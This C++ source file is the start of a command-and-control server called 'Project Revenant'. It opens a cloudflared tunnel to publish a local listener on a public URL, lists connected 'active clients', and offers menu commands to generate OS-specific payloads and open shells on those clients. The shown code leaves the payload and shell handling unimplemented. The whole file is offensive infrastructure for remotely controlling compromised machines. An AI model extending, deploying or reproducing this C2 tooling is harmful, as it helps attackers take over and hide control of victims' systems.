#include <iostream>
#include <cstdlib>
#include <unordered_map>
#include <memory>
#include <stdexcept>
#include <string>
using namespace std;

int id = 0;



string start_cloudflared() {

    system("cloudflared tunnel --url http://localhost:8080 > cloudflared.log 2>&1 &");


    sleep(6); 

    FILE* pipe = popen("grep -o 'https://[^ ]*trycloudflare.com' cloudflared.log", "r");
    if (!pipe) {
        throw runtime_error("popen() failed!");
    }

    char buffer[128];
    string result = "";
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        result += buffer;
    }

    pclose(pipe);

    cout << "Cloudflared URL: " << result << endl;
    return result;
    }

    void help() {
        string output = "\n"
                        "generate os=<OS>\n"
                        "show shell\n"
                        "shell <shell-id>\n"
                        "help\n\n";
        cout << output;
}

void banner() {
    cout << R"(

██████  ███████ ██    ██ ███████ ███    ██  █████  ███    ██ ████████ 
██   ██ ██      ██    ██ ██      ████   ██ ██   ██ ████   ██    ██    
██████  █████   ██    ██ █████   ██ ██  ██ ███████ ██ ██  ██    ██    
██   ██ ██      ██    ██ ██      ██  ██ ██ ██   ██ ██  ██ ██    ██    
██   ██ ███████  ██████  ███████ ██   ████ ██   ██ ██   ████    ██    
                                                                         

                Lightweight C2 Server - Project Revenant
------------------------------------------------------------------

)" << endl;
}
void show_shell(const unordered_map<string, int>& mp) {
    cout << "\n============================\n";
    cout << "   [+] Active Clients\n";
    cout << "============================\n";

    if (mp.empty()) {
        cout << "[!] No active clients.\n";
    } else {
        int count = 1;
        for (const auto& pair : mp) {
            cout << "[" << count << "] " << pair.first << "\n";
            count++;
        }
    }

    cout << "----------------------------\n";
    cout << "Usage: shell <Endpoint>\n";
    cout << "----------------------------\n\n";
}

//system("cloudflared tunnel --url http://localhost:8080 > cloudflared.log 2>&1 & echo $! > cloudflared.pid");
//system("kill $(cat cloudflared.pid)");
//system("rm cloudflared.pid");  // clean up PID file